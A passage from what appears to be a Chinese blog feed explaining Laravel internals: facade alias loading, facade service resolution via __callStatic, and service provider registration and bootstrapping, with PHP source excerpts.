Illuminate\Support\Facades\App::class,</span><br><span class="line">    <span class="string">'Artisan'</span> =&gt; Illuminate\Support\Facades\Artisan::class,</span><br><span class="line">    <span class="string">'Auth'</span> =&gt; Illuminate\Support\Facades\Auth::class,</span><br><span class="line">    ......</span><br><span class="line">    <span class="string">'Route'</span> =&gt; Illuminate\Support\Facades\Route::class,</span><br><span class="line">    ......</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>看一下AliasLoader里是如何注册这些别名的</p><pre><code>// class: Illuminate\Foundation\AliasLoader</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static <span class="keyword">function</span> getInstance(array <span class="variable">$aliases</span> = [])</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (is_null(static::<span class="variable">$instance</span>)) &#123;</span><br><span class="line">          <span class="built_in">return</span> static::<span class="variable">$instance</span> = new static(<span class="variable">$aliases</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$aliases</span> = array_merge(static::<span class="variable">$instance</span>-&gt;getAliases(), <span class="variable">$aliases</span>);</span><br><span class="line"></span><br><span class="line">      static::<span class="variable">$instance</span>-&gt;setAliases(<span class="variable">$aliases</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">return</span> static::<span class="variable">$instance</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public <span class="keyword">function</span> register()</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (! <span class="variable">$this</span>-&gt;registered) &#123;</span><br><span class="line">          <span class="variable">$this</span>-&gt;prependToLoaderStack();</span><br><span class="line"></span><br><span class="line">          <span class="variable">$this</span>-&gt;registered = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  protected <span class="keyword">function</span> prependToLoaderStack()</span><br><span class="line">  &#123;</span><br><span class="line">      // 把AliasLoader::load()放入自动加载函数队列中，并置于队列头部</span><br><span class="line">      spl_autoload_register([<span class="variable">$this</span>, <span class="string">'load'</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>通过上面的代码段可以看到AliasLoader将load方法注册到了SPL __autoload函数队列的头部。看一下load方法的源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> load(<span class="variable">$alias</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;aliases[<span class="variable">$alias</span>])) &#123;</span><br><span class="line">        <span class="built_in">return</span> class_alias(<span class="variable">$this</span>-&gt;aliases[<span class="variable">$alias</span>], <span class="variable">$alias</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在load方法里把<code>$aliases</code>配置里的Facade类创建了对应的别名，比如当我们使用别名类<code>Route</code>时PHP会通过AliasLoader的load方法为<code>Illuminate\Support\Facades\Route</code>类创建一个别名类<code>Route</code>，所以我们在程序里使用别<code>Route</code>其实使用的就是<code>Illuminate\Support\Facades\Route</code>类。</p><h3 id="解析Facade代理的服务"><a href="#解析Facade代理的服务" class="headerlink" title="解析Facade代理的服务"></a>解析Facade代理的服务</h3><p>把Facades注册到框架后我们在应用程序里就能使用其中的Facade了，比如注册路由时我们经常用<code>Route::get(&#39;/uri&#39;, &#39;Controller@action);</code>，那么<code>Route</code>是怎么代理到路由服务的呢，这就涉及到在Facade里服务的隐式解析了， 我们看一下Route类的源码：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">namespace <span class="type">Illuminate</span>\<span class="type">Support</span>\<span class="type">Facades</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the registered name of the component.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> static function getFacadeAccessor()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="symbol">'route</span>r';</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有简单的一个方法，并没有<code>get</code>, <code>post</code>, <code>delete</code>等那些路由方法, 父类里也没有，不过我们知道调用类不存在的静态方法时会触发PHP的<code>__callStatic</code>静态方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取Facade根对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从服务容器里解析出Facade对应的服务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">static</span>::$resolvedInstance[$name])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name] = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的分析我们可以看到Facade类的父类<code>Illuminate\Support\Facades\Facade</code>是Laravel提供的一个抽象外观类从而让我们能够方便的根据需要增加新的子系统的外观类，并让外观类能够正确代理到其对应的子系统(或者叫服务)。</p><p>通过在子类Route Facade里设置的accessor(字符串router)， 从服务容器中解析出对应的服务，router服务是在应用程序初始化时的registerBaseServiceProviders阶段（具体可以看Application的构造方法）被<code>\Illuminate\Routing\RoutingServiceProvider</code>注册到服务容器里的:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoutingServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register the service provider.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registerRouter();</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register the router instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerRouter</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="string">'router'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($app)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Router($app[<span class="string">'events'</span>], $app);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>router服务对应的类就是<code>\Illuminate\Routing\Router</code>, 所以Route Facade实际上代理的就是这个类，Route::get实际上调用的是<code>\Illuminate\Routing\Router</code>对象的get方法。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Register a new GET route with the router.</span><br><span class="line"> *</span><br><span class="line"> * @param  string  <span class="variable">$uri</span></span><br><span class="line"> * @param  \Closure|array|string|null  <span class="variable">$action</span></span><br><span class="line"> * @<span class="built_in">return</span> \Illuminate\Routing\Route</span><br><span class="line"> */</span><br><span class="line">public <span class="keyword">function</span> get(<span class="variable">$uri</span>, <span class="variable">$action</span> = null)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$this</span>-&gt;addRoute([<span class="string">'GET'</span>, <span class="string">'HEAD'</span>], <span class="variable">$uri</span>, <span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>补充两点:</p><ol><li><p>解析服务时用的<code>static::$app</code>是在最开始的<code>RegisterFacades</code>里设置的，它引用的是服务容器。</p></li><li><p>static::$app[‘router’];以数组访问的形式能够从服务容器解析出router服务是因为服务容器实现了SPL的ArrayAccess接口, 对这个没有概念的可以看下官方文档<a href="http://php.net/manual/zh/class.arrayaccess.php" target="_blank" rel="noopener">ArrayAccess</a></p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过梳理Facade的注册和使用流程我们可以看到Facade和服务提供器（ServiceProvider）是紧密配合的，所以如果以后自己写Laravel自定义服务时除了通过组件的ServiceProvider将服务注册进服务容器，还可以在组件中提供一个Facade让应用程序能够方便的访问你写的自定义服务。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之服务提供者</title>
      <link href="/2018/10/10/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%8D%E5%8A%A1%E6%8F%90%E4%BE%9B%E8%80%85/"/>
      <url>/2018/10/10/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%8D%E5%8A%A1%E6%8F%90%E4%BE%9B%E8%80%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>服务提供者是所有 Laravel 应用程序引导中心。你的应用程序自定义的服务、第三方资源包提供的服务以及 Laravel 的所有核心服务都是通过服务提供器进行注册(register)和引导(boot)的。</p><p>比如我之前开发的简单的第三方资源包-<a href="https://github.com/shisiying/sevenshi-serverchan" target="_blank" rel="noopener">一个基于server酱推送服务的laravel package,包含一对一和一对多推送</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace Sevenshi\Serverchan;</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/7/17</span><br><span class="line"> * Time: 17:30</span><br><span class="line"> */</span><br><span class="line">use Illuminate\Support\ServiceProvider;</span><br><span class="line">class SevenServiceProvider extends ServiceProvider</span><br><span class="line">&#123;</span><br><span class="line">    protected <span class="variable">$defer</span> = <span class="literal">true</span>;</span><br><span class="line">    public <span class="keyword">function</span> boot()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;publishes([</span><br><span class="line">            __DIR__.<span class="string">'/../config/serverchan.php'</span> =&gt; config_path(<span class="string">'serverchan.php'</span>),</span><br><span class="line">        ], <span class="string">'serverchan'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> register()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;mergeConfigFrom( __DIR__.<span class="string">'/../config/serverchan.php'</span>, <span class="string">'serverchan'</span>);</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;singleton(<span class="string">'serverchan'</span>, <span class="keyword">function</span> (<span class="variable">$app</span>) &#123;</span><br><span class="line">            <span class="variable">$config</span> = <span class="variable">$app</span>-&gt;make(<span class="string">'config'</span>);</span><br><span class="line">            <span class="variable">$SCKEY</span> = <span class="variable">$config</span>-&gt;get(<span class="string">'serverchan.SCKEY'</span>);</span><br><span class="line">            <span class="built_in">return</span> new SevenService(<span class="variable">$SCKEY</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">provides</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> [<span class="string">'serverchan'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体怎么编写服务提供器可看<a href="https://laravel-china.org/docs/laravel/5.5/providers/1290#deferred-providers" target="_blank" rel="noopener">文档</a></p><p>接下来我们可以由服务提供者来讲，laravel是如何注册、和初始化这些服务的，前面我们提到laravel的生命周期</p><p><img src="laravel生命周期.png" alt="laravel生命周期"></p><p>从图我们可以看到laravel注册和引导应用需要的服务是发生在请求处理工作阶段，在框架的入口文件里我们可以看到，框架在实例化了Application对象后从服务容器中解析出了HTTP Kernel对象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>在Kernel处理请求时会先让请求通过中间件然后在发送请求给路由对应的控制器方法， 在这之前有一个BootStrap阶段来引导启动Laravel应用程序，如下面代码所示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> handle(<span class="variable">$request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$this</span>-&gt;sendRequestThroughRouter(<span class="variable">$request</span>);</span><br><span class="line">    ......</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$response</span>;</span><br><span class="line">&#125;</span><br><span class="line">protected <span class="keyword">function</span> sendRequestThroughRouter(<span class="variable">$request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, <span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;bootstrap();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> (new Pipeline(<span class="variable">$this</span>-&gt;app))</span><br><span class="line">                    -&gt;send(<span class="variable">$request</span>)</span><br><span class="line">                    -&gt;through(<span class="variable">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : <span class="variable">$this</span>-&gt;middleware)</span><br><span class="line">                    -&gt;<span class="keyword">then</span>(<span class="variable">$this</span>-&gt;dispatchToRouter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//引导启动Laravel应用程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> bootstrap()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$this</span>-&gt;app-&gt;hasBeenBootstrapped()) &#123;</span><br><span class="line">/**依次执行<span class="variable">$bootstrappers</span>中每一个bootstrapper的bootstrap()函数</span><br><span class="line">        <span class="variable">$bootstrappers</span> = [</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\DetectEnvironment'</span>,</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\LoadConfiguration'</span>,</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\ConfigureLogging'</span>,</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\HandleExceptions'</span>,</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\RegisterFacades'</span>,</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\RegisterProviders'</span>,</span><br><span class="line">             <span class="string">'Illuminate\Foundation\Bootstrap\BootProviders'</span>,</span><br><span class="line">            ];*/</span><br><span class="line">            <span class="variable">$this</span>-&gt;app-&gt;bootstrapWith(<span class="variable">$this</span>-&gt;bootstrappers());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面bootstrap中会分别执行每一个bootstrapper的bootstrap方法来引导启动应用程序的各个部分</p><ul><li>DetectEnvironment  检查环境</li><li>LoadConfiguration  加载应用配置</li><li>ConfigureLogging   配置日至</li><li>HandleException    注册异常处理的Handler</li><li>RegisterFacades    注册Facades </li><li>RegisterProviders  注册Providers </li><li>BootProviders      启动Providers</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Foundation;</span><br><span class="line"></span><br><span class="line">class Application extends Container implements ...</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> bootstrapWith(array <span class="variable">$bootstrappers</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;hasBeenBootstrapped = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$bootstrappers</span> as <span class="variable">$bootstrapper</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapping: '</span>.<span class="variable">$bootstrapper</span>, [<span class="variable">$this</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$this</span>-&gt;make(<span class="variable">$bootstrapper</span>)-&gt;bootstrap(<span class="variable">$this</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapped: '</span>.<span class="variable">$bootstrapper</span>, [<span class="variable">$this</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动应用程序的最后两部就是注册服务提供这和启动提供者，如果对前面几个阶段具体时怎么实现的可以参考这篇文章<a href="https://segmentfault.com/a/1190000006946685#articleHeader5" target="_blank" rel="noopener">Laravel学习笔记之bootstrap源码解析</a>。在这里我们主要关注服务提供器的注册和启动。</p><p>先来看注册服务提供器，服务提供器的注册由类 \Illuminate\Foundation\Bootstrap\RegisterProviders::class 负责，该类用于加载所有服务提供器的 register 函数，并保存延迟加载的服务的信息，以便实现延迟加载。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class RegisterProviders</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> bootstrap(Application <span class="variable">$app</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        //调用了Application的registerConfiguredProviders()</span><br><span class="line">        <span class="variable">$app</span>-&gt;registerConfiguredProviders();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">class Application extends Container implements ApplicationContract, HttpKernelInterface</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> registerConfiguredProviders()</span><br><span class="line">    &#123;</span><br><span class="line">        (new ProviderRepository(<span class="variable">$this</span>, new Filesystem, <span class="variable">$this</span>-&gt;getCachedServicesPath()))</span><br><span class="line">                    -&gt;load(<span class="variable">$this</span>-&gt;config[<span class="string">'app.providers'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> getCachedServicesPath()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;bootstrapPath().<span class="string">'/cache/services.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出，所有服务提供器都在配置文件 app.php 文件的 providers 数组中。类 ProviderRepository 负责所有的服务加载功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class ProviderRepository</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> load(array <span class="variable">$providers</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$manifest</span> = <span class="variable">$this</span>-&gt;loadManifest();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;shouldRecompile(<span class="variable">$manifest</span>, <span class="variable">$providers</span>)) &#123;</span><br><span class="line">            <span class="variable">$manifest</span> = <span class="variable">$this</span>-&gt;compileManifest(<span class="variable">$providers</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        foreach (<span class="variable">$manifest</span>[<span class="string">'when'</span>] as <span class="variable">$provider</span> =&gt; <span class="variable">$events</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;registerLoadEvents(<span class="variable">$provider</span>, <span class="variable">$events</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        foreach (<span class="variable">$manifest</span>[<span class="string">'eager'</span>] as <span class="variable">$provider</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;app-&gt;register(<span class="variable">$provider</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;addDeferredServices(<span class="variable">$manifest</span>[<span class="string">'deferred'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loadManifest()会加载服务提供器缓存文件services.php，如果框架是第一次启动时没有这个文件的，或者是缓存文件中的providers数组项与config/app.php里的providers数组项不一致都会编译生成services.php。</p><p>//判断是否需要编译生成services文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> shouldRecompile(<span class="variable">$manifest</span>, <span class="variable">$providers</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> is_null(<span class="variable">$manifest</span>) || <span class="variable">$manifest</span>[<span class="string">'providers'</span>] != <span class="variable">$providers</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>//编译生成文件的具体过程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 